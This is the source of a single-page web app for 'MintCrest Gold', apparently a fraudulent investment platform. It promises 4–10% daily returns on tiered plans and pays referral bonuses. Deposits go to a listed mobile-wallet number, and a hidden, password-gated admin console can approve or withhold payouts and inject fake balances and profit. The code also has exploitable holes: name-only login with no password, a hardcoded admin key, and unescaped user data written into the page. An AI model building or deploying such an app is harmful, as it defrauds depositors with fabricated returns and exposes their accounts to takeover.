<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>MintCrest Gold | Professional Digital Custody</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;400;600;800&display=swap');
        
        :root { --accent: #3b82f6; --bg: #000205; --glass: rgba(255, 255, 255, 0.03); }
        
        body { 
            font-family: 'Plus Jakarta Sans', sans-serif; 
            background: var(--bg); 
            color: white; 
            overflow-x: hidden; 
            -webkit-tap-highlight-color: transparent;
        }

        .glass { background: var(--glass); backdrop-filter: blur(40px); border: 1px solid rgba(255,255,255,0.08); }
        .btn-glow { box-shadow: 0 0 20px rgba(59, 130, 246, 0.3); }
        
        /* Navigation Styles */
        .active-tab { color: var(--accent); position: relative; }
        .active-tab::after { content: ''; position: absolute; top: -24px; left: 50%; transform: translateX(-50%); width: 30px; height: 4px; background: var(--accent); border-radius: 0 0 10px 10px; box-shadow: 0 5px 15px var(--accent); }

        /* Page Animations */
        .page { display: none; animation: slideUp 0.4s cubic-bezier(0.4, 0, 0.2, 1); }
        .active-page { display: block; }
        @keyframes slideUp { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }

        /* Custom Scrollbar */
        ::-webkit-scrollbar { width: 0px; }
        
        /* Status Badges */
        .badge-pending { @apply bg-yellow-500/10 text-yellow-500 px-3 py-1 rounded-full text-[8px] font-black uppercase; }
        .badge-approved { @apply bg-green-500/10 text-green-400 px-3 py-1 rounded-full text-[8px] font-black uppercase; }
        .badge-rejected { @apply bg-red-500/10 text-red-500 px-3 py-1 rounded-full text-[8px] font-black uppercase; }
        
        /* Ticker Animation */
        .ticker-container { background: rgba(59, 130, 246, 0.05); overflow: hidden; white-space: nowrap; padding: 6px 0; border-bottom: 1px solid rgba(255,255,255,0.05); }
        .ticker-text { display: inline-block; animation: ticker 40s linear infinite; font-size: 9px; font-weight: 800; color: #3b82f6; text-transform: uppercase; letter-spacing: 1.5px; }
        @keyframes ticker { 0% { transform: translateX(100%); } 100% { transform: translateX(-100%); } }
    </style>
</head>
<body class="h-screen flex flex-col">

    <div class="ticker-container">
        <div class="ticker-text">
            💎 LIVE: GLOBAL ASSET AUDIT COMPLETED • USER 'ARSLAN' ACTIVATED TIER 12 • SECURITY PROTOCOL V15.0 ACTIVE • WITHDRAWALS PROCESSED IN < 2 HOURS • GOLD RESERVES VERIFIED • 
        </div>
    </div>

    <section id="auth-ui" class="fixed inset-0 z-[1000] bg-[#000205] flex items-center justify-center p-8">
        <div class="w-full max-w-sm text-center">
            <div class="mb-12">
                <h1 onclick="adminTap()" class="text-5xl font-extrabold italic tracking-tighter cursor-pointer">MINT<span class="text-blue-500">CREST</span></h1>
                <p class="text-gray-500 text-[9px] uppercase tracking-[0.5em] mt-2 font-bold">Advanced Asset Management</p>
            </div>
            <div class="glass p-10 rounded-[3.5rem] border-t-2 border-blue-500/50">
                <input type="text" id="user-name" placeholder="Full Legal Name" class="w-full bg-white/5 p-5 rounded-2xl border border-white/10 outline-none text-center font-bold mb-5 focus:border-blue-500 transition-all placeholder:text-gray-600">
                <button onclick="login()" class="w-full bg-blue-600 py-5 rounded-2xl font-black text-[11px] uppercase tracking-widest btn-glow active:scale-95 transition-all">Initialize Security Vault</button>
                <p class="mt-8 text-[8px] opacity-20 font-bold uppercase tracking-widest leading-loose">Protected by 256-bit AES Encryption<br>MintCrest Enterprise Global</p>
            </div>
        </div>
    </section>

    <main id="app-ui" class="hidden flex-1 overflow-y-auto pb-32">
        
        <div id="p-home" class="page active-page p-6">
            <div class="glass p-10 rounded-[3.5rem] mb-6 border-l-[10px] border-blue-600 relative overflow-hidden">
                <div class="absolute top-0 right-0 p-6 opacity-10"><h1 class="text-6xl font-black italic">MCG</h1></div>
                <p class="text-[10px] text-blue-400 font-extrabold mb-1 uppercase tracking-[0.2em]">Available Capital</p>
                <h2 class="text-5xl font-black tracking-tighter mb-4" id="v-bal">₨ 0</h2>
                <div id="countdown-display" class="text-[10px] font-black text-yellow-500 uppercase italic tracking-widest mb-6 animate-pulse">Syncing Blockchain...</div>
                <div class="flex gap-3">
                    <span class="text-[9px] bg-green-500/10 text-green-400 px-5 py-2 rounded-full font-black border border-green-500/20 uppercase tracking-tighter">Net Profit: <span id="v-profit">₨ 0</span></span>
                    <span id="tier-tag" class="text-[9px] bg-white/5 text-gray-400 px-5 py-2 rounded-full font-black uppercase italic border border-white/10">No Active Tier</span>
                </div>
            </div>

            <div class="grid grid-cols-2 gap-4 mb-8">
                <button onclick="changePage('wallet')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95 transition border-b-2 border-blue-600">
                    <span class="text-3xl block mb-2">📥</span>
                    <span class="text-[10px] font-black uppercase tracking-widest">Deposit</span>
                </button>
                <button onclick="changePage('withdraw')" class="glass p-8 rounded-[2.5rem] text-center active:scale-95 transition border-b-2 border-red-600">
                    <span class="text-3xl block mb-2">📤</span>
                    <span class="text-[10px] font-black uppercase tracking-widest">Withdraw</span>
                </button>
            </div>

            <div class="glass p-8 rounded-[2.5rem] border border-white/5">
                <div class="flex items-center gap-4 mb-4">
                    <div class="w-10 h-10 rounded-full bg-blue-600/20 flex items-center justify-center text-blue-500 font-black">!</div>
                    <h4 class="text-[10px] font-black uppercase tracking-widest">System Notice</h4>
                </div>
                <p id="expiry-display" class="text-[10px] leading-relaxed opacity-50 font-medium">All trading portfolios operate on a 30-day term cycle. Please ensure tier renewal to maintain daily yield requests.</p>
            </div>
        </div>

        <div id="p-invest" class="page p-6">
            <h2 class="text-center font-black italic mb-10 uppercase text-blue-500 text-2xl tracking-tighter">Investment Fleet</h2>
            <div id="plans-list" class="space-y-4 pb-12"></div>
        </div>

        <div id="p-activity" class="page p-6">
            <div class="flex justify-between items-center mb-10">
                <h2 class="font-black italic uppercase text-blue-400 text-xl tracking-tighter">Activity Ledger</h2>
                <span class="text-[8px] bg-blue-600 px-3 py-1 rounded-full font-black uppercase">Realtime Sync</span>
            </div>
            <div id="user-history" class="space-y-3 pb-12"></div>
        </div>

        <div id="p-more" class="page p-6 space-y-6">
            <div class="glass p-10 rounded-[3rem] text-center">
                <div class="text-4xl mb-4">🤝</div>
                <h3 class="font-black text-[12px] uppercase tracking-widest mb-2">Referral Program</h3>
                <p class="text-[9px] text-gray-500 mb-6 uppercase font-bold">Invite partners and earn ₨ 100 bonus.</p>
                <input type="text" id="ref-link" readonly class="w-full bg-white/5 p-5 rounded-2xl text-[10px] text-center font-black mb-4 border border-white/5 outline-none">
                <button onclick="copyRef()" class="w-full bg-blue-600 py-4 rounded-2xl font-black text-[10px] uppercase tracking-widest active:scale-95 transition-all">Copy Invite Link</button>
            </div>

            <div class="glass p-8 rounded-[3rem] space-y-4">
                <div class="flex justify-between text-[10px] font-black uppercase opacity-60"><span>Platform Version</span><span>v15.0.2 Stable</span></div>
                <div class="flex justify-between text-[10px] font-black uppercase opacity-60"><span>Network Status</span><span class="text-green-500">Encrypted</span></div>
            </div>

            <button onclick="logout()" class="w-full glass p-8 rounded-[3rem] text-center text-[10px] font-black text-red-500 uppercase tracking-[0.3em] border border-red-500/10 active:bg-red-500/5">
                🚪 Terminate Session (Logout)
            </button>
        </div>

        <div id="p-wallet" class="page p-6">
            <div class="glass p-12 rounded-[4rem] text-center border-t-[12px] border-blue-600">
                <h3 class="font-black text-blue-500 mb-10 uppercase text-xl tracking-tighter">Capital Injection</h3>
                <div class="space-y-4 mb-12">
                    <div class="glass p-6 rounded-3xl flex justify-between items-center"><div class="text-left"><p class="text-[8px] font-black opacity-40 uppercase">Account</p><p class="text-[12px] font-black text-red-500 uppercase">JazzCash</p></div><p class="text-[14px] font-black tracking-widest">03705519562</p></div>
                    <div class="glass p-6 rounded-3xl flex justify-between items-center"><div class="text-left"><p class="text-[8px] font-black opacity-40 uppercase">Account</p><p class="text-[12px] font-black text-green-500 uppercase">EasyPaisa</p></div><p class="text-[14px] font-black tracking-widest">03705519562</p></div>
                </div>
                <input type="number" id="dep-amount" placeholder="Funding Amount" class="w-full bg-white/5 p-6 rounded-3xl mb-4 text-center font-black text-xl outline-none focus:border-blue-500 transition-all">
                <input type="text" id="dep-trx" placeholder="Transaction ID (TID)" class="w-full bg-white/5 p-6 rounded-3xl mb-10 text-center font-black uppercase outline-none focus:border-blue-500 transition-all">
                <button onclick="submitDeposit()" class="w-full bg-blue-600 py-6 rounded-3xl font-black text-[12px] uppercase tracking-widest btn-glow">Verify Funding Transfer</button>
            </div>
        </div>

        <div id="p-withdraw" class="page p-6">
            <div class="glass p-12 rounded-[4rem] border-t-[12px] border-red-600">
                <h3 class="font-black text-red-500 mb-10 text-center uppercase text-xl tracking-tighter">Asset Liquidation</h3>
                <input type="number" id="wd-amt" placeholder="Withdraw Amount" class="w-full bg-white/5 p-6 rounded-3xl mb-4 text-center font-black text-xl outline-none">
                <input type="text" id="wd-acc" placeholder="Account Details (Name/Number)" class="w-full bg-white/5 p-6 rounded-3xl mb-10 text-center font-black text-[10px] uppercase outline-none">
                <button onclick="submitWithdraw()" class="w-full bg-red-600 py-6 rounded-3xl font-black text-[12px] uppercase tracking-widest active:scale-95 transition-all">Request Payout</button>
                <p class="mt-8 text-center text-[9px] opacity-30 font-bold uppercase tracking-widest">Withdrawals processed within 24 hours</p>
            </div>
        </div>
    </main>

    <div id="admin-panel" class="fixed inset-0 bg-[#000205] z-[5000] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-12">
            <div><h2 class="text-2xl font-black text-blue-500 italic uppercase">Console</h2><p class="text-[8px] font-bold opacity-40">SYSTEM PRIVILEGE LEVEL 01</p></div>
            <button onclick="closeAdmin()" class="bg-red-500/10 text-red-500 px-8 py-3 rounded-2xl text-[10px] font-black uppercase border border-red-500/20">Lock System</button>
        </div>

        <div id="adm-sec-requests" class="space-y-4 mb-16"></div>

        <div class="glass p-10 rounded-[3.5rem] border border-blue-500/20">
            <h4 class="text-[10px] font-black text-center mb-8 opacity-40 uppercase tracking-[0.3em]">Manual Database Override</h4>
            <input type="text" id="adm-user" placeholder="Account Holder Name" class="w-full bg-white/10 p-5 rounded-2xl mb-4 text-center font-bold outline-none border border-white/10">
            <input type="number" id="adm-val" placeholder="Value Amount (PKR)" class="w-full bg-white/10 p-5 rounded-2xl mb-8 text-center font-bold outline-none border border-white/10">
            <div class="grid grid-cols-2 gap-4"><button onclick="manualEdit('balance')" class="bg-blue-600 py-5 rounded-2xl font-black text-[10px] uppercase">Inject Balance</button><button onclick="manualEdit('profit')" class="bg-green-600 py-5 rounded-2xl font-black text-[10px] uppercase">Inject Profit</button></div>
        </div>
    </div>

    <nav id="bottom-nav" class="hidden glass border-t border-white/10 p-8 flex justify-around items-center fixed bottom-0 left-0 w-full z-[200] rounded-t-[4rem]">
        <button onclick="changePage('home')" id="n-home" class="flex flex-col items-center gap-2 active-tab"><span class="text-2xl">🏠</span><span class="text-[9px] font-black uppercase tracking-tighter">Vault</span></button>
        <button onclick="changePage('invest')" id="n-invest" class="flex flex-col items-center gap-2"><span class="text-2xl">📈</span><span class="text-[9px] font-black uppercase tracking-tighter">Fleet</span></button>
        <button onclick="changePage('activity')" id="n-activity" class="flex flex-col items-center gap-2"><span class="text-2xl">📜</span><span class="text-[9px] font-black uppercase tracking-tighter">Ledger</span></button>
        <button onclick="changePage('more')" id="n-more" class="flex flex-col items-center gap-2"><span class="text-2xl">🛡️</span><span class="text-[9px] font-black uppercase tracking-tighter">Legal</span></button>
    </nav>

    <script>
        // CONFIGURATION & INITIALIZATION
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.firebasestorage.app", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig); const db = firebase.firestore();
        
        let user = null; let tapCount = 0;
        const plans = [
            { n: "Starter-I", p: 500, r: 4 }, { n: "Starter-II", p: 1000, r: 4 }, { n: "Starter-III", p: 1500, r: 4.5 }, { n: "Bronze-I", p: 2000, r: 4.5 }, { n: "Bronze-II", p: 3000, r: 5 }, { n: "Bronze-III", p: 4000, r: 5 }, { n: "Silver-I", p: 5000, r: 5.5 }, { n: "Silver-II", p: 7000, r: 5.5 }, { n: "Silver-III", p: 10000, r: 6 }, { n: "Gold-I", p: 15000, r: 6 }, { n: "Gold-II", p: 20000, r: 6.5 }, { n: "Gold-III", p: 25000, r: 6.5 }, { n: "Platinum-I", p: 30000, r: 7 }, { n: "Platinum-II", p: 40000, r: 7 }, { n: "Platinum-III", p: 50000, r: 7.5 }, { n: "Diamond-I", p: 60000, r: 7.5 }, { n: "Diamond-II", p: 70000, r: 8 }, { n: "Diamond-III", p: 80000, r: 8 }, { n: "Elite Master", p: 90000, r: 9 }, { n: "Royal Custody", p: 100000, r: 10 }
        ];

        window.onload = () => { 
            const saved = localStorage.getItem('mintcrest_user'); 
            if(saved) { document.getElementById('user-name').value = saved; login(); }
            setInterval(updateCountdown, 1000);
        };

        // ADMIN ACCESS LOGIC
        function adminTap() { tapCount++; if(tapCount >= 3) { tapCount = 0; if(prompt("ACCESS KEY:") === "mint786") { document.getElementById('admin-panel').classList.remove('hidden'); syncAdmin(); } } setTimeout(()=>tapCount=0,2000); }

        // AUTHENTICATION
        async function login() {
            const name = document.getElementById('user-name').value.trim(); if(!name) return;
            localStorage.setItem('mintcrest_user', name);
            const ref = db.collection("users").doc(name); const doc = await ref.get();
            
            if(!doc.exists) {
                const urlParams = new URLSearchParams(window.location.search);
                const referrer = urlParams.get('ref');
                await ref.set({ name: name, balance: 0, profit: 0, time: Date.now(), activeTier: 0, tierROI: 0, lastReqTime: Date.now(), tierExpiry: 0 });
                if(referrer && referrer !== name) {
                    await db.collection("requests").add({ user: referrer, amount: 100, type: "Referral Bonus (New: "+name+")", status: "pending", time: Date.now() });
                }
            }
            startSync(name); document.getElementById('auth-ui').style.display='none'; document.getElementById('app-ui').classList.remove('hidden'); document.getElementById('bottom-nav').classList.remove('hidden');
            renderPlans(); document.getElementById('ref-link').value = window.location.origin + window.location.pathname + "?ref=" + name;
        }

        function logout() { if(confirm("Are you sure you want to logout?")) { localStorage.removeItem('mintcrest_user'); location.reload(); } }

        // REAL-TIME SYNC
        function startSync(name) {
            db.collection("users").doc(name).onSnapshot(doc => { 
                if(doc.exists) { 
                    user = doc.data(); 
                    document.getElementById('v-bal').innerText = "₨ " + (user.balance || 0).toLocaleString(); 
                    document.getElementById('v-profit').innerText = "₨ " + (user.profit || 0).toLocaleString();
                    document.getElementById('tier-tag').innerText = user.tierName || "No Tier Active";
                    
                    if(user.tierExpiry > 0) {
                        const daysLeft = Math.ceil((user.tierExpiry - Date.now()) / 86400000);
                        document.getElementById('expiry-display').innerText = daysLeft > 0 ? `Your ${user.tierName} will expire in ${daysLeft} days.` : "Your tier has expired. Please renew.";
                        if(daysLeft <= 0) resetTier(name);
                    }
                    checkProfitRequirement(user);
                } 
            });
            db.collection("requests").where("user", "==", name).onSnapshot(snap => {
                const list = document.getElementById('user-history'); list.innerHTML = snap.empty ? '<p class="text-center opacity-20 py-20 text-[10px] font-black uppercase">No Ledger Entries Found</p>' : '';
                let items = []; snap.forEach(doc => items.push(doc.data())); items.sort((a,b) => b.time - a.time);
                items.forEach(d => {
                    const border = d.type.includes('deposit') ? 'border-blue-500' : (d.type.includes('Profit') ? 'border-green-500' : 'border-red-500');
                    list.innerHTML += `<div class="glass p-6 rounded-3xl flex justify-between items-center border-l-4 ${border} mb-2 text-[10px] font-black uppercase"><div>${d.type}<br><span class="opacity-30 text-[7px] font-medium">${new Date(d.time).toLocaleDateString()}</span></div><div class="text-right">₨ ${d.amount.toLocaleString()}<br><span class="badge-${d.status}">${d.status}</span></div></div>`;
                });
            });
        }

        // PROFIT & CYCLE ENGINE
        function updateCountdown() {
            if (user && user.activeTier > 0) {
                const diff = (user.lastReqTime + 86400000) - Date.now();
                if (diff > 0) {
                    const h = Math.floor(diff / 3600000); const m = Math.floor((diff % 3600000) / 60000); const s = Math.floor((diff % 60000) / 1000);
                    document.getElementById('countdown-display').innerText = `NEXT YIELD: ${h}h ${m}m ${s}s`;
                } else { document.getElementById('countdown-display').innerText = "YIELD REQ PENDING..."; }
            } else { document.getElementById('countdown-display').innerText = "SYSTEM IDLE: ACTIVATE TIER"; }
        }

        async function checkProfitRequirement(userData) {
            const now = Date.now();
            if (userData.activeTier > 0 && (now - userData.lastReqTime) >= 86400000) {
                const dailyProfit = (userData.activeTier * userData.tierROI) / 100;
                await db.collection("requests").add({ user: userData.name, amount: dailyProfit, type: "Daily Profit Yield", status: "pending", time: now });
                await db.collection("users").doc(userData.name).update({ lastReqTime: now });
            }
        }

        async function resetTier(name) { await db.collection("users").doc(name).update({ activeTier: 0, tierROI: 0, tierName: "Expired", tierExpiry: 0 }); }

        // APP LOGIC
        function renderPlans() { 
            const list = document.getElementById('plans-list'); list.innerHTML = ''; 
            plans.forEach(p => { 
                list.innerHTML += `<div onclick="buy(${p.p}, ${p.r}, '${p.n}')" class="glass p-7 rounded-[2.5rem] flex justify-between items-center active:scale-95 mb-1 cursor-pointer transition-all border border-white/5"><div><h4 class="font-black text-[12px] uppercase text-blue-500">${p.n}</h4><p class="text-[10px] text-green-400 font-bold uppercase tracking-tighter">${p.r}% Daily Yield / 30 Days</p></div><p class="font-black text-lg tracking-tighter">₨ ${p.p.toLocaleString()}</p></div>`; 
            }); 
        }

        async function buy(p, roi, tierName) { 
            if(user.balance < p) { alert("Insufficient Capital in Vault."); changePage('wallet'); } 
            else { 
                const expiry = Date.now() + (30 * 86400000);
                await db.collection("users").doc(user.name).update({ balance: user.balance - p, activeTier: p, tierROI: roi, tierName: tierName, tierExpiry: expiry, lastReqTime: Date.now() }); 
                await db.collection("requests").add({ user: user.name, amount: p, type: "Tier Purchase: "+tierName, status: "approved", time: Date.now() });
                alert("Portfolio " + tierName + " Activated!"); changePage('activity');
            } 
        }

        function changePage(p) { document.querySelectorAll('.page').forEach(pg=>pg.classList.remove('active-page')); document.querySelectorAll('nav button').forEach(b=>b.classList.remove('active-tab')); document.getElementById('p-'+p).classList.add('active-page'); if(p!=='wallet'&&p!=='withdraw') document.getElementById('n-'+p).classList.add('active-tab'); }
        
        async function submitDeposit() { const a = document.getElementById('dep-amount').value; const t = document.getElementById('dep-trx').value; if(!a||!t) return alert("Fill all fields."); await db.collection("requests").add({user:user.name, amount:parseInt(a), tid:t, type:"deposit", status:"pending", time:Date.now()}); alert("Funding Sent for Verification."); changePage('activity'); }
        async function submitWithdraw() { const a = document.getElementById('wd-amt').value; const acc = document.getElementById('wd-acc').value; if(!a||!acc||a>user.balance) return alert("Check balance/fields."); await db.collection("requests").add({user:user.name, amount:parseInt(a), acc:acc, type:"withdraw", status:"pending", time:Date.now()}); await db.collection("users").doc(user.name).update({balance:user.balance-parseInt(a)}); alert("Payout Request Sent."); changePage('activity'); }
        function copyRef() { const c = document.getElementById('ref-link'); c.select(); document.execCommand('copy'); alert("Referral Link Copied!"); }

        // ADMIN PANEL ENGINE
        function syncAdmin() {
            db.collection("requests").where("status", "==", "pending").onSnapshot(snap => {
                const list = document.getElementById('adm-sec-requests'); list.innerHTML = snap.empty ? '<p class="text-center opacity-30 text-[10px] font-black uppercase">No Orders Pending</p>' : '';
                snap.forEach(doc => { const d = doc.data(); list.innerHTML += `<div class="glass p-6 rounded-3xl flex justify-between items-center border-l-4 border-blue-500 mb-3 text-[10px] uppercase font-black"><div>${d.user}<br>₨ ${d.amount}<br><span class="text-blue-400">${d.type}</span></div><div class="flex gap-2"><button onclick="handleReq('${doc.id}', '${d.user}', ${d.amount}, 'approved', '${d.type}')" class="bg-green-600 px-6 py-3 rounded-xl">APPROVE</button><button onclick="handleReq('${doc.id}', '${d.user}', ${d.amount}, 'rejected', '${d.type}')" class="bg-red-600 px-6 py-3 rounded-xl">REJECT</button></div></div>`; });
            });
        }

        async function handleReq(id, target, amt, action, type) {
            const ref = db.collection("users").doc(target); const d = await ref.get();
            if(action === 'approved') {
                if(type === 'deposit' || type.includes('Profit') || type.includes('Referral')) await ref.update({ balance: (d.data().balance || 0) + amt });
            } else if(action === 'rejected' && type === 'withdraw') { await ref.update({ balance: (d.data().balance || 0) + amt }); }
            await db.collection("requests").doc(id).update({ status: action });
        }

        async function manualEdit(f) { const u = document.getElementById('adm-user').value.trim(); const v = document.getElementById('adm-val').value; if(!u||!v) return alert("Enter Name & Value"); const ref = db.collection("users").doc(u); const d = await ref.get(); if(d.exists) { await ref.update({ [f]: (d.data()[f] || 0) + parseInt(v) }); alert("Updated!"); } else alert("User Not Found"); }
        function closeAdmin() { document.getElementById('admin-panel').classList.add('hidden'); }
    </script>
</body>
</html>
